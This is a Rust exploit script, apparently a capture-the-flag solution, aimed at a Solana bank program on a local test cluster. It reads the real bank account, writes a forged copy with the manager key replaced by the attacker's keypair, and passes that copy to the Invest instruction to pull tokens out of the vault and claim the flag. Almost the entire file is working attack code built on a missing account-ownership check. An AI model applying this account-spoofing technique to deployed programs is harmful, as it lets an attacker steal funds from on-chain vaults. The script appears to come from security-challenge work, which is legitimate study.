use std::str::FromStr;

use poc_framework::{
    borsh,
    borsh::BorshDeserialize,
    borsh::BorshSerialize,
    keypair, localhost_client, random_keypair,
    solana_client::{rpc_config::RpcProgramAccountsConfig, rpc_filter::RpcFilterType},
    solana_sdk::{
        instruction::{AccountMeta, Instruction},
        pubkey::Pubkey,
        signature::read_keypair_file,
        signer::Signer,
    },
    spl_token, Environment, PrintableTransaction, RemoteEnvironment,
};

#[derive(Debug, BorshSerialize, BorshDeserialize)]
pub struct Bank {
    /// manager may withdraw user funds to invest them
    pub manager_key: [u8; 32],

    /// address of the token vault (program-derived key)
    pub vault_key: [u8; 32],

    /// address of the token vault authority (program-derived key)
    pub vault_authority: [u8; 32],

    /// seed for the vault authority
    pub vault_authority_seed: u8,

    /// percentage of total deposits that must be held as reserve in the vault at all times
    pub reserve_rate: u8,

    /// total amount of deposits
    pub total_deposit: u64,
}
pub const BANK_LEN: u64 = 106;

/// Instructions that this program supports
#[derive(Debug, BorshDeserialize, BorshSerialize)]
pub enum BankInstruction {
    /// Initialize the bank
    ///
    /// To protect from scams, only a single bank is supported.
    /// Thus, the address of the bank account must be the program-derived address with empty seed.
    ///
    /// Passed accounts:
    ///
    /// (1) Bank account
    /// (2) Manager's account, pays for creation of bank account (must sign)
    /// (3) Vault account
    /// (4) Mint
    /// (5) Rent sysvar
    /// (6) System program
    /// (7) spl-token program
    Initialize { reserve_rate: u8 },

    /// Open a new user account with the bank
    ///
    /// Passed accounts:
    ///
    /// (1) User account to open
    /// (2) Withdrawer account (a signature from this account is required for withdraw)
    /// (3) System program
    ///
    /// The withdrawer account needs enough SOL to pay for the rent of the new account, and must sign the transaction
    /// to open the account.
    Open,

    /// Transfer money into bank account
    ///
    /// Passed accounts:
    ///
    /// (1) Bank account
    /// (2) Vault account
    /// (3) User account for deposit
    /// (4) Source token account to transfer money from
    /// (5) Source token account authority (must sign)
    /// (6) spl-token program
    /// (7) Solana Clock sysvar
    Deposit { amount: u64 },

    /// Withdraw money from bank account
    ///
    /// Passed accounts:
    ///
    /// (1) Bank account
    /// (2) Vault account
    /// (3) User account to withdraw from
    /// (4) Token account where withdrawed money will be transfered to
    /// (5) Withdrawer account. Must sign and match the withdrawer specified when the account was opened.
    /// (6) spl-token program
    /// (7) Solana Clock sysvar
    Withdraw { amount: u64 },

    /// (Manager only) take money for investing
    ///
    /// The manager should transfer the invested money back into the vault
    /// if the vault runs low. This function ensures that there at least
    /// the percentage given by reserve_rate remains in the vault.
    ///
    /// Passed accounts:
    ///
    /// (1) Bank account
    /// (2) Vault account
    /// (3) Destination token account
    /// (4) Manager's account (requires signature)
    /// (5) SPL token program
    Invest { amount: u64 },
}

fn main() {
    let client = localhost_client();
    let payer = read_keypair_file("rich-boi.json").unwrap();
    let mut env = RemoteEnvironment::new(localhost_client(), payer);

    let bank_program = Pubkey::from_str("Bank111111111111111111111111111111111111111").unwrap();
    let flag_mint = Pubkey::from_str("F1agMint11111111111111111111111111111111111").unwrap();
    let flag_program = Pubkey::from_str("F1ag111111111111111111111111111111111111111").unwrap();
    let fake_manager = keypair(0);
    let fake_bank = random_keypair();

    // create account to steal token to
    let flag_token_acc = env.get_or_create_associated_token_account(&fake_manager, flag_mint);

    // fetch bank
    let (_, bank_account) = client
        .get_program_accounts_with_config(
            &bank_program,
            RpcProgramAccountsConfig {
                filters: Some(vec![RpcFilterType::DataSize(BANK_LEN)]),
                ..RpcProgramAccountsConfig::default()
            },
        )
        .unwrap()[0]
        .clone();

    // set manager key to our own key
    let mut bank = Bank::try_from_slice(&bank_account.data).unwrap();
    bank.manager_key = fake_manager.pubkey().to_bytes();

    // write fake bank to chain
    env.create_account_with_data(&fake_bank, bank.try_to_vec().unwrap());
    println!("written fake bank data to {}", fake_bank.pubkey());

    // withdraw token with fake admin key
    env.execute_as_transaction(
        &[Instruction {
            program_id: bank_program,
            accounts: vec![
                AccountMeta::new(fake_bank.pubkey(), false),
                AccountMeta::new(Pubkey::new(&bank.vault_key), false),
                AccountMeta::new(Pubkey::new(&bank.vault_authority), false),
                AccountMeta::new(flag_token_acc, false),
                AccountMeta::new_readonly(fake_manager.pubkey(), true),
                AccountMeta::new_readonly(spl_token::ID, false),
            ],
            data: BankInstruction::Invest { amount: 1 }.try_to_vec().unwrap(),
        }],
        &[&fake_manager],
    )
    .print();

    // get flag
    env.execute_as_transaction(
        &[Instruction {
            program_id: flag_program,
            accounts: vec![
                AccountMeta::new_readonly(flag_token_acc, false),
                AccountMeta::new_readonly(fake_manager.pubkey(), true),
            ],
            data: vec![],
        }],
        &[&fake_manager],
    )
    .print_named("flag");
}
